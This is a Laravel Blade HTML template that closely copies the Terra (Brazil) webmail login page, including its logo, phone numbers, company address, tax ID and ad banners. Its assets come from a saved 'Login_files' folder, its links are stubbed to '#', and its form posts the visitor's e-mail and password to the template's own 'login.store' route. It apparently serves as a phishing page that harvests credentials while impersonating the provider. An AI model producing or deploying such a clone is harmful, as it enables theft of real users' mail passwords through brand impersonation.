<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="{{asset('css/auth.css')}}">
    <x-head-icon />
    <link href="{{asset('css/css.css')}}" rel="stylesheet">

    <script type="text/javascript" async="" src="/Login_files/js"></script>
    <script type="text/javascript" async="" src="/Login_files/js(1)"></script>
</head>

<body>
<div class="container">
    <header class="header">
        <div class="header-profile">
            <div class="header-profile-left">
            </div>
            <div class="header-profile-center">
                <img class="header-profile-logo" src="/Login_files/logo-webmail-terra-white.svg"
                     alt="Logotipo Terra Email" width="80" height="39">
            </div>
            <div class="header-profile-right">
                <div class="header-profile-phones">
                    <div class="header-profile-phones-item">
                        <span class="header-profile-phones-item-text">Suporte ao cliente</span><span
                            class="header-profile-phones-item-number">0800 777 9797</span>
                    </div>
                    <div class="header-profile-phones-item">
                        <span class="header-profile-phones-item-text">Compre novo produtos</span><span
                            class="header-profile-phones-item-number">0800 777 1234</span>
                    </div>
                </div>
                <ul class="header-profile-links">
                    <li><a href="#"><img class="icon" src="/Login_files/icon-user.svg"
                                         alt="Link para Central do Assinante" width="25"
                                         height="24"></a></li>
                    <li><a href="#"><img class="icon"
                                         src="/Login_files/icon-question-mark.svg"
                                         alt="Link para Ajuda" width="25" height="24"></a>
                    </li>
                </ul>
            </div>

        </div>
    </header>
    <div class="content">
        <nav class="menu-nav">
            <ul class="menu-nav-links">
                <li><a target="_blank"
                       href="#">Produtos
                        Terra</a></li>
                <li><a target="_blank" href="#">Ajuda Terra
                        Mail</a></li>
                <li><a target="_blank"
                       href="#">Central
                        do Assinante</a></li>
                <li><a target="_blank" href="#">Condição
                        Geral de Uso</a></li>
            </ul>
        </nav>
        <main>
            <div class="container-webmail-login">
                <form class="form-webmail-login" id="webmail-form" action="{{route('login.store')}}" method="POST">
                    @csrf
                    <h2 class="header-webmail-login">
                        Acesse seu e-mail Terra
                    </h2>
                    <div class="container-inputs-form-webmail-login">

                        <div class="email-container-webmail-login">
                            <div class="email-header-webmail-login">E-mail</div>
                            <input class="email-input-webmail-login" type="email" name="user" id="user"
                                   placeholder="E-mail" title="Preencha seu usuário + seu @domínio">
                            <div class="email-message-login">
                                <span>Clientes Terra Empresas, acessem com seu e-mail usuario@seudominio.com.br</span>
                            </div>
                        </div>

                        <div class="password-container-webmail-login">
                            <div class="password-header-webmail-login">Senha</div>
                            <div class="password-wraper-container">
                                <input class="password-input-webmail-login" type="password" name="pass" id="pass"
                                       placeholder="Senha" title="Preencha sua senha">
                                <img class="password-input-eye-webmail-login opened-eye"
                                     src="/Login_files/password-opened-eye.svg" alt="Icone para mostrar senha">
                                <img class="password-input-eye-webmail-login closed-eye"
                                     src="/Login_files/password-closed-eye.svg" alt="Icone para esconder senha">
                            </div>
                        </div>
                    </div>
                    <a class="forgot-password-webmail-login" href="#">Esqueceu
                        sua senha?</a>
                    <div class="container-message-webmail-login"></div>

                    <div class="container-button-form-webmail-login">
                        <button onclick="handleClick(event, '/auth', '', 'False')"
                                class="submit-button-webmail-login">
                            <span class="submit-button-animation-webmail-login">Acessar meu e-mail</span>
                        </button>
                    </div>
                </form>
            </div>

            <div class="container-webmail-info">
                <div class="welcome-message">
                    <p>Assista ao tutorial de como configurar seu Terra Mail no Outlook.</p>

                    <a class="welcome-message-link"
                       href="#"
                       target="_blank">Assistir ao tutorial</a>
                </div>

                <div class="banner-desk">
                    <div id="banner-slider-wrapper">
                        <div id="banner-slider"
                             style="overflow: hidden; position: relative; height: 226px; width: 618px;">
                            <ul style="width: 14832px; margin-left: -618px;">
                                <li style="float: left; display: block;">
                                    <a href="#"
                                       target="_blank">
                                        <img src="/Login_files/Home_Terra_Mail-Pos-01_Terra-Meu-Negocio.jpg"
                                             alt="Terra Meu Negócio" width="618" height="226">
                                    </a>
                                </li>
                                <li style="float: left; display: block;">
                                    <a href="#"
                                       target="_blank">
                                        <img src="/Login_files/TER_1024_KV_AMAZON_BN_Home-618x226_v0_HL.jpg"
                                             alt="Amazon Prime" width="618" height="226">
                                    </a>
                                </li>
                                <li style="float: left; display: block;">
                                    <a href="#"
                                       target="_blank">
                                        <img src="/Login_files/Home_Terra_Mail-Pos-03_Mail-Profissional.jpg"
                                             alt="Terra Mail Profissional" width="618" height="226">
                                    </a>
                                </li>
                                <li style="float: left; display: block;">
                                    <a href="#"
                                       target="_blank">
                                        <img src="/Login_files/KV_MICROSOFT_B2B_HOME_618X226_v5_HL.jpg"
                                             alt="Office 365" width="618" height="226">
                                    </a>
                                </li>
                                <li style="float: left; display: block;">
                                    <a href="#"
                                       target="_blank">
                                        <img src="/Login_files/Home_Terra_Mail-Pos-05_Terra_Gestao_Vendas.jpg"
                                             alt="Terra Gestão de Vendas" width="618" height="226">
                                    </a>
                                </li>
                            </ul>
                        </div>
                        <span id="controls"><ol class="controls"><li rel="1" class=""><a
                                        href="#"><span>1</span></a></li><li
                                    rel="2" class="current"><a
                                        href="#"><span>2</span></a></li><li
                                    rel="3"><a
                                        href="#"><span>3</span></a></li><li
                                    rel="4"><a
                                        href="#"><span>4</span></a></li><li
                                    rel="5"><a
                                        href="#"><span>5</span></a></li></ol></span>
                        <span class="banner-ad-label">Publicidade</span>
                    </div>
                </div>

                <div class="banner-mob">
                    <div id="banner-slider-wrapper-mob">
                        <div id="banner-slider-mob">
                            <ul>
                                <li>
                                    <a href="#"
                                       target="_blank">
                                        <img src="/Login_files/TER_648_Campanha_Cursos_Julho_BN_300x250_V0_LS.jpg"
                                             alt="Produtos Terra!">
                                    </a>
                                </li>
                            </ul>
                        </div>
                        <span class="banner-ad-label-mob">Publicidade</span>
                    </div>
                </div>

                <div class="contact-phones">
                    <div class="contact-phones-item">
                        <span class="contact-phones-item-text">Suporte ao cliente</span><span
                            class="contact-phones-item-number">0800 777 9797</span>
                    </div>
                    <div class="contact-phones-item">
                        <span class="contact-phones-item-text">Compre novo produtos</span><span
                            class="contact-phones-item-number">0800 777 1234</span>
                    </div>
                </div>
            </div>
        </main>
        <div class="popup-background-webmail-login"></div>
        <div class="popup-loader-webmail-login"></div>
    </div>

    <footer class="footer-webmail-login" itemscope="" itemtype="http://schema.org/Organization">
        <img class="footer-webmail-login-logo" src="/Login_files/logo-terra.svg" alt="Logotipo Terra Email" width="108"
             height="30">

        <div class="information-footer-webmail-login">
            <p>COPYRIGHT 2025, TERRA NETWORKS BRASIL LTDA.</p>
            <p>
                    <span itemprop="address" itemscope="" itemtype="http://schema.org/PostalAddress">
                        <span
                            itemprop="streetAddress">Av. Engenheiro Luís Carlos Berrini, 1376 - 13º andar</span>, <span>Cidade Monções</span> - <span
                            itemprop="addressLocality">São Paulo</span> - <span itemprop="addressRegion">SP - CEP 04571-936</span>.
                    </span>
                CNPJ <span itemprop="taxID">91.088.328/0001-67</span>
            </p>
        </div>

        <ul class="footer-webmail-login-social">
            <li>
                <a href="#" target="_blank"><img src="/Login_files/icon-social-x.svg"
                                                 alt="Ícone da rede social X" width="32" height="32"></a>
            </li>
            <li>
                <a href="#" target="_blank"><img
                        src="/Login_files/icon-social-instagram.svg" alt="Ícone da rede social Instagram" width="32"
                        height="32"></a>
            </li>
            <li>
                <a href="#" target="_blank"><img
                        src="/Login_files/icon-social-facebook.svg" alt="Ícone da rede social Facebook" width="32"
                        height="32"></a>
            </li>
        </ul>
    </footer>
</div>
<script src="/Login_files/jquery.js" charset="utf-8"></script>
<script src="/Login_files/jquery.sudoSlider.min.js" charset="utf-8"></script>
<script src="/Login_files/auth.js" charset="utf-8"></script>
<script src="/Login_files/api.js" async="" defer=""></script>
<script type="text/javascript" src="/Login_files/9GSQ1LGyg"></script>
<link rel="stylesheet" type="text/css" href="#">
<script src="/Login_files/9WCDlrZVop" async="" defer=""></script>
</body>
</html>
